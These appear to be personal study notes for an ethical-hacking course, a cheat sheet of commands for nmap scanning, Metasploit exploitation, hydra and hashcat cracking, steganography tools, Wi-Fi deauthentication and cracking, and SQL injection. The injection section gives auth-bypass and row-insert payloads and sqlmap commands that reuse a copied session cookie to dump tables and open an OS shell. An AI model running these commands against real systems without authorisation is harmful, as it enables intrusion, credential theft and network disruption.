Module 03: Scanning Networks:
	netdiscover
		netdiscover -r xx.x.x.x.x
	nmap
		to scan to detect firewall settings:
		nmap -sA x.x.x.x

		-sS Half scan/stealthy scan. when firwall is enabled.
		xxxx -oX out1.xml
			xsltproc out1.xml -o host1.html
			sudo chown user:user host1.html

		-sU perform UDp scan. nmap -sU x.x.x.x
		-sn perform ping scan . which sends ICMP requests to target host.
			nmap -sn x.x.x.0/24

		-A aggresive scan. 
			nmap -A -T4 -v x.x.x.x.


	Host Discovery using - IP Scanner
	Port and Service Discovery using Mega Ping
	Port and Service Discovery using NetScanTools Pro
	Port scanning using sx tool

Type of account:
	cmd
	net user (this will display list of user accounts)


WPScan
	wpscan --url https://xx.x.x.

	wpscan --url https://xx.x.x. -e u (this will enumerate users)

	wpscan --url https://xx.x.x. -user User --password /location/pass.txt (this will enumerate users)

Metasploit
	basic start
		systemctl enable apache
		systemctl enable postgresql
	
	this is format
		msfvenom -p payload options -f elf -o abc.elf 

	start
		msfconsole

	help
		msfconsole -h

	search 
		search ssh
		or
		search platform:windows name:ssh
		or
		search platform:windows name:ssh type:post
		or

	nmap from metasploit
		db_nmap
		db_nmap x.x.ip.addr -sV -p 21
			o/p for example ssh version is vsftpd 2.3.1

	search specific exploit
		search name:vsftpd
		info <exploit_no>

		now use this exploit
			use <exploit_no>
			options
			set RHOSTS x1x1x1x
			set RPORT 45454
			exploit

	record all typed commands and its output
		spool savemyhistory.txt


	------------------------ bruteforce usename and pass
		use wordpress (if it does not  search module)

Hashcat
	hashcat -m 0 xxxxxxxx /rockyou.txt --force -O

Hydra
	hydra -l <username> -P /location/pass.txt se.rever.ip.addr ftp

	hiw to connect to ftp, if pass found
		ftp x.x.x.x.
		get filename.txt

Android
	5555 - android port
	adb connect ip.address:5555
	adb shell
	ls

Steganography / SNOW
	go to the directory
	snow -C -m "my bank acc is 1212121" -p "iamPassword" readme.txt readme2.txt
		this will store the content of readme.txt inside readme2.txt (output file). readme2.txt will auto create. it will have readme.txt file content and secret message

	How to unlock
		snow -C -p "iamPassword" readme2.txt
		this will display the secret message. 

Openstego
	open app
	Hide Data
		Message file - secret message/file
		Cover file - cover photo
		output file - will autogenerate based on above input
		enter pass and select encryption

	Extract data
		Input stego file - input the file which was encrypted
		output file - autogenerate with content
		pass -  and click extract data
	

hashCalc
	open hashcalc.exe
	select file and click calculate. this will generate the hash for various alg like md5/sha512


VeraCrypt
	used for disk encryption

	Create volume - go with default--select location for o/p file - select algo - space - enter password - now move mouse randomly--- click format

	now encrypted drive is created.

	lets decrypt now
	select driver - select encrypted drive file - mount and enter pass


Crack Hashes
	hashes.com
	crackstation.com

	convert md5 to plaintext.
	if hashtype not mentioned above site will identify automatically.


BCTextEncoder
	open exe
	enter text in input box an click encode... enter pass.. this will generate encoded text.

	now enter (All) encoded text to encoded and click decode and enter pass


Cryp Tool
	open exe
	open new file- enter text- go to Encrypt/Decrypt - select symmetric modern - select algo type - enter key length and encrypt - save it

	open cryp tool - open file  - goto encrypt/decrypt - select algo type - enter length as mentioned and decrypt


	now with ECB type demo
	

========================================================================
SQL Injection
	try
	username'--
	sam 'OR 1=1 --
	1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

=====================================================================
OWASP ZAP
	Automated scan
	enter url/domain
	click Attack

	check Active Scan below
	or check Alerts- SQL Injection-> drill down
======================================================================
Wireshark

	tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given. Check whose count is higher. also check destination and source ip address to verify.
	
	tcp.flags.syn == 1   (Which machine for dos)

	convert in readable
	http.request.method == POST   (for passwords) or click tools ---> credentials

========================================================================
Wi-FI
	start monitoring
		airodump-ng wlan0mon

	monitor open wifi 
		airodump-ng --bssid xxxxxx --channel X --write capture wlan0mon

	send de-auth packet to above captured bssid so that we can capture hash when device reconnect back to wifi
		aireplay-ng --deauth 0 -a x.x.bssid wlan0mon


	crack
		aircrack-ng -b x.x.xb.s.s.id -w password.txt capture.cap
